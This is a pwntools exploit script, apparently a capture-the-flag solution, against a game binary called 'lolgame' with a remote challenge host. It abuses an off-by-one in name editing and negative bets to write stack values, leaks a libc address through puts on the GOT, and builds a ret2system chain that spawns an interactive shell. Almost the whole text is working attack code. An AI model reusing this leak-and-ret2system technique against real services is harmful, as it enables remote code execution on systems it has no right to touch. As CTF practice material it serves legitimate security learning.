"""
	Off-by-one vulnerability when changing name => arbitrary memory write after game loss
"""

from pwn import *
	
puts = 0x80483d6
main = 0x8048a2a
GOT  = 0x804910c

def name(data):
	r.sendlineafter('name: \n', data)
	return

def play(bet, row):
	r.sendlineafter('Choice:\n', '1')
	r.sendlineafter('Point: ', str(bet))

	col = 0
	for i in range(3):
		r.sendlineafter('row: ', str(row))
		r.sendlineafter('column: ', str(col))
		col += 1

	return

def edit(name):
	r.sendlineafter('Choice:\n', '3')
	r.sendafter('name: \n', name)

def leak():
	r.sendlineafter('Choice:\n', '4')
	r.recvuntil('Bye!')
	return u32(r.recv(4))

def pwn():

	name('kek')
	
	edit('A'*0x10 + p8(0x39))
	# return address => puts
	play(-puts, 1)
	# main's index
	edit('A'*0x10 + p8(0x3a))

	play(-main, 1)
	# puts' arg index
	edit('A'*0x10 + p8(0x3b))
	# puts(GOT)
	play(-GOT, 1)

	libc = leak() - 0x005fca0 
	sys  = libc   + 0x0003ada0
	sh   = libc   + 0x15ba0b
	log.success('Libc:   0x{:x}'.format(libc))	
	log.success('system: 0x{:x}'.format(sys))
	
	name('kek')
	# Stack has slightly different alignment and 
	# thus different offsets are needed
	edit('A'*0x10 + p8(0x37))
	# return address => system
	play(-sys, 1)
	
	edit('A'*0x10 + p8(0x38))
	# system's return address -- doesn't matter
	play(-0xb00bface, 1)

	edit('A'*0x10 + p8(0x39))
	# system('sh')
	play(-sh, 1)
	# ret2system
	r.sendlineafter('Choice:\n', '4')
	
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('lolgame.acebear.site', 3004)
        pwn()
    else:
        r = process('./lolgame')
        pause()
        pwn()
